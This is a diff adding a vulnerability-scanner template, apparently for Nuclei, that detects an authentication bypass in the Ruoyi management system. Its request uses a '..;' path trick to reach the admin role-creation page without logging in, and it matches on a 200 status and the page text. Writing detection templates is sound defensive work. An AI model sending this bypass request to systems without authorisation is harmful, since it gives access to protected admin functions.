@@ -1,0 +1,19 @@
+id: ruoyi-manage-system-auth-bypass
+info:
+  name: Ruoyi Management System Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: auth-bypass
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/docs/..;/system/role/add"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "新增角色"
